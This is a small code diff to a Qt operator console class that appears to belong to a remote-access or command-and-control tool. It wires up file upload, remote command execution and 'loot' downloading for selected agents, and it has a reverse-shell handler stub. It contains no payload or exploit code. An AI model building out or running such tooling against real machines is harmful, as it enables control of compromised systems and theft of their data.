@@ -87,7 +87,7 @@ class TestMgr(QtGui.QMainWindow, design.Ui_MainWindow):
             return
         print("[ ] Waiting for file selection...")
         file = misc.open_file()
-        self.session.upload_file(file, self.AgentList.currentItem().text())
+        self.session.upload_file(self.AgentList.currentItem().text(), file)
 
     def pull_file(self):
         if not self.has_selection():
@@ -98,8 +98,8 @@ class TestMgr(QtGui.QMainWindow, design.Ui_MainWindow):
     def exec_comm(self):
         if not self.has_selection():
             return
-        
-        print("Executing command")
+        diag = dialogues.AgentCommandDialogue(self.session, self.AgentList.currentItem().text())
+        diag.exec()
 
     def rev_sh(self):
         if not self.has_selection():
@@ -112,6 +112,7 @@ class TestMgr(QtGui.QMainWindow, design.Ui_MainWindow):
             return
         
         print("Getting loot")
+        self.session.download_loot(self.AgentList.currentItem().text())
 
     def push_module(self):
         if not self.has_selection():
